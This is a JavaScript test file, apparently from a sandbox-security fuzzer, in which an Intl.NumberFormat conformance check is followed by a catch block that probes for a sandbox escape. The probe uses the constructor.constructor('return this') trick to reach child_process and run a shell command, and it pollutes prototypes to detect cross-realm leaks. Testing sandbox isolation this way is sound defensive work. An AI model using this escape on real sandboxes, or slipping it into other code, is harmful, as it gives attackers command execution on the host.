try {
    var numberFormatter = new Intl.NumberFormat();
    var percentFormatter = new Intl.NumberFormat(undefined, { style: 'percent' });
    var formattedTwenty = numberFormatter.format(20);
    var formattedTwentyPercent = percentFormatter.format(0.2);
    assert.notSameValue(formattedTwentyPercent.indexOf(formattedTwenty), -1, 'Intl.NumberFormat\'s formatting of 20% does not include a formatting of 20 as a substring.');
    assert.notSameValue(percentFormatter.format(0.011), percentFormatter.format(0.02), 'Intl.NumberFormat is formatting 1.1% and 2% the same way.');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}